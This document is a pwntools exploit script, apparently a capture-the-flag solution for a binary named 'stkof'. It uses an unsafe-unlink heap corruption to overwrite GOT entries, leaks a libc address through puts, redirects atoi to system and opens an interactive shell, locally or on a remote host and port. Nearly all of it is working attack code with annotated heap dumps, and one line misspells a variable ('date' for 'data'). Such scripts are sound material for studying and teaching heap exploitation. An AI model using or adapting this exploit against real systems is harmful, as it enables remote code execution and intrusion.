# --==[[ unsafe unlink

from pwn import *

array    = 0x602148
fd       = array - (3*8)
bk       = array - (2*8)
free_got = 0x602018
atoi_got = 0x602088
atoi_off = 0x39ea0
sys_off  = 0x46590
sh_off   = 0x180503
puts_plt = 0x400766

def alloc(size):

	r.sendline('1')
	r.sendline(str(size))

	r.recvuntil('OK\n')

	return

# Indexing starts from 1
def fill(idx, size, data):

	r.sendline('2')
	r.sendline(str(idx))
	r.sendline(str(size))

	if len(data) < size:
		date += "\n"
	r.send(data)

	r.recvuntil('OK\n')

	return

def free(idx):

	r.sendline('3')
	r.sendline(str(idx))

	return

def pwn():

	alloc(0x80) # chunk 1
	alloc(0x80) # chunk 2
	alloc(0x80) # chunk 3

	fake_chunk  = p64(0)
	fake_chunk += p64(0x8)
	fake_chunk += p64(fd)
	fake_chunk += p64(bk)
	fake_chunk += 'A'*0x60
	fake_chunk += p64(0x80)
	fake_chunk += p8(0x90)

	fill(1, len(fake_chunk), fake_chunk)

	##########################################################################
	#
	#	0xe05000:	0x0000000000000000	0x0000000000000091 <-- chunk 1
	#	0xe05010:	0x0000000000000000	0x0000000000000008 <-- fake chunk [free]
	#	0xe05020:	0x0000000000602130	0x0000000000602138
	#	0xe05030:	0x4141414141414141	0x4141414141414141
	#	0xe05040:	0x4141414141414141	0x4141414141414141
	#	0xe05050:	0x4141414141414141	0x4141414141414141
	#	0xe05060:	0x4141414141414141	0x4141414141414141
	#	0xe05070:	0x4141414141414141	0x4141414141414141
	#	0xe05080:	0x4141414141414141	0x4141414141414141
	#	0xe05090:	0x0000000000000080	0x0000000000000090 <-- chunk 2 [to be free'd]
	#	0xe050a0:	0x0000000000000000	0x0000000000000000
	#
	##########################################################################
	
	# unlink
	free(2)

	##########################################################################
	#
	#	0x602140:	0x0000000000000000	0x0000000000602130 <-- array - (3*8)
	#	0x602150:	0x0000000000000000	0x0000000000e05130
	#
	##########################################################################

	fill(1, 48, p64(0)*3 + p64(free_got) + p64(atoi_got)*2)

	##########################################################################
	#
	#	0x602148:	0x0000000000602018	0x0000000000602088
	#	0x602158:	0x0000000000602088	0x0000000000000000
	#
	##########################################################################

	# free => puts
	fill(1, 8, p64(puts_plt))

	# Leak atoi's address
	free(2)

	r.recvuntil('OK\n')

	atoi   = u64(r.recv(6).ljust(8, '\x00'))
	libc   = atoi - atoi_off
	system = libc + sys_off
	binsh  = libc + sh_off

	log.info("atoi:   0x{:x}".format(atoi))
	log.info("Libc:   0x{:x}".format(libc))
	log.info("system: 0x{:x}".format(system))
	
	# atoi => system
	fill(3, 8, p64(system))

	r.sendline('sh')

	r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        pwn()
    else:
        r = process('./stkof')
        pause()
        pwn()
